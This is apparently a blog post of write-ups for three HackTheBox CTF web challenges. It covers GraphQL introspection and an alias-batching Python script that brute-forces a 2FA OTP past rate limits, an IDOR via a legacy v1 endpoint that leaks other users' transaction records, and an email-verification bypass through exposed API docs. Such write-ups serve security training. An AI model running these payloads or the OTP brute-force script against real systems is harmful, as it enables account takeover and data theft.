---
title: "Hack The System - Bug Bounty CTF Writeups (Part 2)"
date: 2025-10-25
excerpt: "This event organized by HackTheBox"
tags:
  - HackTheSystem
  - feroxbuster
  - IDOR
  - GraphQL
  - API endpoint
  - SSTI
---
# SpeedNet - HackTheSystem 2025

## Challenge description

Speednet is an ISP platform. Join our bug bounty to find vulnerabilities and retrieve the hidden flag. Test using the email service at `http://IP:PORT/emails/` with address test@email.htb

## Exploitation

### 1. Recon

This is a blackbox challenge.

The provided website has account registration functionality:

![alt text](/images/posts/hack-the-system/SpeedNet/image-3.png)

Account login:

![alt text](/images/posts/hack-the-system/SpeedNet/image-2.png)

`Forgot your password?` function to reset password if forgotten:

![alt text](/images/posts/hack-the-system/SpeedNet/image-4.png)

Register account with the email provided in Challenge description:

![alt text](/images/posts/hack-the-system/SpeedNet/image-5.png)

Request when forgot password with email as parameter:

![alt text](/images/posts/hack-the-system/SpeedNet/image-6.png)

Check received emails:

![alt text](/images/posts/hack-the-system/SpeedNet/image-7.png)

Access the provided link, note to change `speednet.htb` -> host instance. Example `http://94.237.54.192:59785/reset-password?token=9b0575c2-4199-4f50-a364-bfca451327f7`. Reset password interface as shown:

![alt text](/images/posts/hack-the-system/SpeedNet/image-11.png)

Reset with new password = 1:

![alt text](/images/posts/hack-the-system/SpeedNet/image-12.png)

Notice this web uses GraphQL -> There may be GraphQL API vulnerabilities.

After login, there is Profile Settings function to update profile information:

![alt text](/images/posts/hack-the-system/SpeedNet/image-8.png)

Billing function, this function seems unusable:

![alt text](/images/posts/hack-the-system/SpeedNet/image-9.png)

Usage function is probably similar to Billing:

![alt text](/images/posts/hack-the-system/SpeedNet/image-10.png)

### 2. Attack vector - IDOR

Register account then login, this is the first account registered when running instance but the userID in request has value = 2 -> account userID = 1 may be admin account.

![alt text](/images/posts/hack-the-system/SpeedNet/image.png)

Try changing request with query userID = 1:

![alt text](/images/posts/hack-the-system/SpeedNet/image-1.png)

Admin account information appears, now to login to admin account we need password.

Currently only GraphQL is the point that can be further exploited.

### 3. Attack vector - GraphQL

[Reference](https://portswigger.net/web-security/graphql), first try payload probing for introspection. This payload aims to ask what the root object containing all Queries is. Response returns Query -> Introspection is enabled -> GraphQL server allows you to view its entire API structure

Payload: 

```
{
    "query": "{__schema{queryType{name}}}"
}
```

![alt text](/images/posts/hack-the-system/SpeedNet/image-13.png)

Continue with payload to see more root objects

Payload:

```
{
    "query": "{__schema{types{name}}}"
}
```

![alt text](/images/posts/hack-the-system/SpeedNet/image-15.png)

Next, need to see the names of all queries and mutations (write/edit/delete actions) that can be executed.

Payload: 
    
```
{
"query": "query { __schema { queryType { name fields { name } } mutationType { name fields { name } } } }"
}
```

![alt text](/images/posts/hack-the-system/SpeedNet/image-16.png)

In the `mutationType` list appears `devForgotPassword`, this is a function for developers -> exploitable point

With the `devForgotPassword` function, send forgot password request with admin's email (GraphQL server works with values passed directly into the query)

Payload: 
```
{
"query": "mutation { devForgotPassword(email: \"admin@speednet.htb\") }"
}
```

![alt text](/images/posts/hack-the-system/SpeedNet/image-14.png)

-> Received reset token

Payload to change admin account password with the received reset token

```
{
    "query": "mutation { resetPassword(token: \"6a7b4f5a-ff0b-4b02-8d09-b229a9317437\", newPassword: \"1\") }"
}
```

![alt text](/images/posts/hack-the-system/SpeedNet/image-17.png)

Login with admin account: `admin@speednet.htb/1` requires authentication

![alt text](/images/posts/hack-the-system/SpeedNet/image-18.png)

At this point there are 2 approaches: 1 is using Burp Intruder to brute force OTP, 2 is using a script. However, if brute forcing from 1 - 9999, using Burp will be slow because it sends 1 OTP/1 request -> write a script to exploit GraphQL's feature called Aliases, meaning if sending 1 OTP/1 request sequentially, the web will check rate limiting (rate limit mechanism usually counts HTTP requests per second), so by combining 500 attempts into one request, the script can bypass the rule -> GraphQL Batching Attack (Remember to replace **Password reset token** and instance in the script correctly). Script:

```python
import httpx
import argparse
import time
import json

class Exploiter:
    def __init__(self, target: str):
        self.client = httpx.Client(base_url=target, timeout=10.0)

    def verify_token(self, token: str, start: int, end: int):
        query = "mutation {\n"
        for i in range(start, end + 1):
            otp = f"{i:04d}"
            query += f'  verify{i}: verifyTwoFactor(token: "{token}", otp: "{otp}") {{\n'
            query += "    token\n"
            query += "  }\n"
        query += "}\n"
        return self.client.post("/graphql", json={"query": query})

    def exploit(self):
        token = "86f795fa-5ab2-4382-adef-1dd85cf1e6e8"
        step = 499
        
        for start in range(1, 10000, step):
            end = min(start + step - 1, 9999)
            print(f"Batching: {start:04d} - {end:04d}")
            res = self.verify_token(token, start, end)

            try:
                data = res.json().get("data", {})
                if not data:
                    continue

                for key, value in data.items():
                    if isinstance(value, dict) and "token" in value:
                        found_otp = f"{int(key.replace('verify', '')):04d}"
                        new_token = value.get("token")
                        
                        print(f"\n\nSuccess! Found valid OTP:")
                        print(f"    >>> OTP: {found_otp}")
                        print(f"    >>> New token: {new_token}\n")
            except (json.JSONDecodeError, AttributeError):
                continue
            
            time.sleep(1) 

    @staticmethod
    def parse_args():
        parser = argparse.ArgumentParser(description="Exploit a GraphQL 2FA endpoint.")
        parser.add_argument("-t", "--target", required=True, help="Target base URL (e.g., http://host:port)")
        return parser.parse_args()

if __name__ == "__main__":
    args = Exploiter.parse_args()
    exploiter = Exploiter(args.target)
    exploiter.exploit()

```

![alt text](/images/posts/hack-the-system/SpeedNet/image-22.png)

This is the token with admin's verified login session

Use this token to replace the `Authorization` field of any request fetching to endpoint `/graphql` (for example in Billing function)

![alt text](/images/posts/hack-the-system/SpeedNet/image-23.png)

![alt text](/images/posts/hack-the-system/SpeedNet/image-24.png)

Flag: HTB{gr4phql_3xpl01t_1n_a_nutsh3ll}
---

# NeoVault - HacktheSystem 2025

## Challenge description

Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within.

## Exploitation

### 1. Recon

This is a blackbox challenge

Initial interface of the website as shown

![alt text](/images/posts/hack-the-system/NeoVault/image.png)

Register and login with a valid account. The initial account is provided with $100.00

![alt text](/images/posts/hack-the-system/NeoVault/image-8.png)

Use Burp to capture requests (or check DevTools), notable APIs appear with API versions embedded in endpoints

![alt text](/images/posts/hack-the-system/NeoVault/image-1.png)

These endpoints have both `v1` and `v2`, it's possible that endpoints using `v2` have been updated with some features compared to the original `v1` -> attack surface may appear here

### 2. Attack

Use Burp to capture requests and try replacing endpoints using `v2` with `v1`. Endpoint `/api/v2/transactions/download-transactions` returns notable results.

When endpoint `/api/v2/transactions/download-transactions` is changed to `/api/v1/transactions/download-transactions`, message appears: `_id is not provided` -> meaning the endpoint being called at `/api/v1/transactions/download-transactions` requires an `_id` field of the user in the payload to determine which user needs to process the request -> IDOR vulnerability may exist

![alt text](/images/posts/hack-the-system/NeoVault/image-4.png)

In the `Transactions` function, we know that `neo_system` is a system user because the "Welcome bonus credit" was sent from this user.

This means if we can get the ID of `neo_system` and pass this user's ID in the payload sent to endpoint `/api/v1/transactions/download-transactions`, we may receive their list of transactions.

In the `Transfer` function, use Burp to capture request when clicking `Confirm Transfer` to see the ID of the recipient. With the goal of getting the UserID of `neo_system`, proceed to transfer money to this user and get UserID of `neo_system = 688b315f7be1a218593f3840`.

![alt text](/images/posts/hack-the-system/NeoVault/image-3.png)

![alt text](/images/posts/hack-the-system/NeoVault/image-2.png)

Send request to endpoint `/api/v1/transactions/download-transactions` with user ID of `neo_system` 
    
![alt text](/images/posts/hack-the-system/NeoVault/2025-07-31_16-04.png)

Received pdf file which is the transactions list of `neo_system`

![alt text](/images/posts/hack-the-system/NeoVault/image-5.png)

A user `user_with_flag` appears, highly likely this user's information contains the flag

Return to the above steps to get UserID of `user_with_flag` -> send request to download pdf file of this user's transactions list

![alt text](/images/posts/hack-the-system/NeoVault/image-6.png)

![alt text](/images/posts/hack-the-system/NeoVault/image-7.png)

Flag: HTB{n0t_s0_3asy_1d0r}
---
# NovaEnergy - HackTheSystem 2025

## Challenge description

NovaEnergy is a internal web application used for file sharing system. This site can only be accessed by employee of NovaEnergy company. You're tasked to hunt for any vulnerabilities that led to any breaches in their site.

## Exploitation

### 1. Recon

This is a blackbox challenge

Initial interface of the website

![alt text](/images/posts/hack-the-system/NovaEnergy/image.png)

![alt text](/images/posts/hack-the-system/NovaEnergy/image-1.png)

![alt text](/images/posts/hack-the-system/NovaEnergy/image-2.png)

The web allows account registration and login

![alt text](/images/posts/hack-the-system/NovaEnergy/image-3.png)

![alt text](/images/posts/hack-the-system/NovaEnergy/image-4.png)

Register account -> Error reports that account must have email ending with `@gonuclear.com`

![alt text](/images/posts/hack-the-system/NovaEnergy/image-5.png)

![alt text](/images/posts/hack-the-system/NovaEnergy/image-6.png)

Successful registration will return an interface requesting account verification

![alt text](/images/posts/hack-the-system/NovaEnergy/image-7.png)

Return to login, because the account has not been verified, the web returns message `Inactive user`

![alt text](/images/posts/hack-the-system/NovaEnergy/image-8.png)

There is also a `Forgot password` function, however Burp does not receive requests when clicking on this function

![alt text](/images/posts/hack-the-system/NovaEnergy/image-9.png)

Check source of web services but nothing notable.

Use `feroxbuster` to scan for resources not referenced through the web

![alt text](/images/posts/hack-the-system/NovaEnergy/image-14.png)

Access the obtained urls one by one, when trying `http://83.136.250.96:33349/api => http://83.136.250.96/api/` the result returns "Not Found".

![alt text](/images/posts/hack-the-system/NovaEnergy/image-20.png)

Initially feroxbuster found hidden resources on the link `http://83.136.250.96/api/` meaning this path is still running some service, use feroxbuster to continue exploiting this url. Result:

![alt text](/images/posts/hack-the-system/NovaEnergy/image-21.png)

Access endpoint '/api/files' 

![alt text](/images/posts/hack-the-system/NovaEnergy/image-22.png)

Access endpoint '/api/docs', this endpoint is not blocked and exposes information about APIs being used

![alt text](/images/posts/hack-the-system/NovaEnergy/image-23.png)

### 2. API endpoint

Register account as normal through API `/register` however afterwards still cannot login because not authenticated

![alt text](/images/posts/hack-the-system/NovaEnergy/image-24.png)

Below there is endpoint `/userDetails` to check information of accounts that have been successfully registered

![alt text](/images/posts/hack-the-system/NovaEnergy/image-26.png)

The response when requesting to `api/userDetails` contains verify token to authenticate account

![alt text](/images/posts/hack-the-system/NovaEnergy/image-27.png)

Request to API `/email-verify` to verify the initially registered account with the token just obtained

![alt text](/images/posts/hack-the-system/NovaEnergy/image-28.png)

![alt text](/images/posts/hack-the-system/NovaEnergy/image-29.png)

After successfully verifying email, return to the initial login page and login normally with the verified account -> interface as shown. A file named `flag.txt` appears

![alt text](/images/posts/hack-the-system/NovaEnergy/image-30.png)

Cannot view directly so must download the flag file

![alt text](/images/posts/hack-the-system/NovaEnergy/image-31.png)

Flag: HTB{g00d_j0b_r3g1str4ti0n_byp4s5}